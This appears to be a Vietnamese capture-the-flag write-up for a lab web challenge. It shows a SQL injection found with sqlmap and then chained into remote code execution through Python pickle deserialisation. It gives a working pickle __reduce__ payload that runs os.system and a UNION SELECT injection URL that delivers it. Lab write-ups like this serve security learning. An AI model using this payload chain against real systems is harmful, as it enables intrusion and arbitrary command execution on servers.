![image](https://github.com/user-attachments/assets/32603254-927c-4b88-a68a-7a9734e36d9f)

Đây là giao diện của trang web:

![image](https://github.com/user-attachments/assets/d2b839de-3ac1-4cac-9c4f-477e42c9e699)

Khi ấn view thì sẽ chạy câu truy vấn đến database để tìm:

![image](https://github.com/user-attachments/assets/9972f098-2cd8-4d47-8033-b72a158006eb)

Và câu truy vấn này không hề dùng dấu ? nên có thể sqli:

![image](https://github.com/user-attachments/assets/4d2261f2-b0b7-45a3-bc32-509fb06c5282)

Tôi dùng `sqlmap -u "http://94.237.54.190:45308/view/2" --batch --level=5 --risk=3 --dump --dbms=SQLite --threads=10` thì ra được boolean-based blind:

![image](https://github.com/user-attachments/assets/0c0cc0b0-4eae-4499-a337-e56117cd933d)

Kết quả in ra nhìn khá lạ

![image](https://github.com/user-attachments/assets/1b603020-94e1-441d-9aff-f94eb4b51f43)

Đọc src code thì bị filter bởi pickle:

![image](https://github.com/user-attachments/assets/f235c71a-c55e-412f-905f-49235125f214)

Và cái pickle thì có thể [khai thác](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) được:

![image](https://github.com/user-attachments/assets/84372e26-27b3-43c6-8817-b85a078962a2)

```
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('cp /app/flag.txt /app/application/static/flag.txt')
        return os.system, (cmd,)
if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
Tôi copy cái flag ra static để có thể xem được, sau đó chạy code thì ra `gASVSQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjDFjcCAvYXBwL2ZsYWcudHh0IC9hcHAvYXBwbGljYXRpb24vc3RhdGljL2ZsYWcudHh0lIWUUpQu`, tiếp dùng `http://94.237.54.190:45308/view/1'%20UNION%20SELECT%20'gASVTAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDFjcCAvYXBwL2ZsYWcudHh0IC9hcHAvYXBwbG%20ljYXRpb24vc3RhdGljL2ZsYWcudHh0lIWUUpQu';--`
 để chạy cmd này:

![image](https://github.com/user-attachments/assets/8361f760-012a-4361-ae0e-22a5731869d0)

Sau khi chạy xong thì vào static/flag.txt là ra:

![image](https://github.com/user-attachments/assets/5a716d12-7755-4341-b865-18ec1d3bf22e)







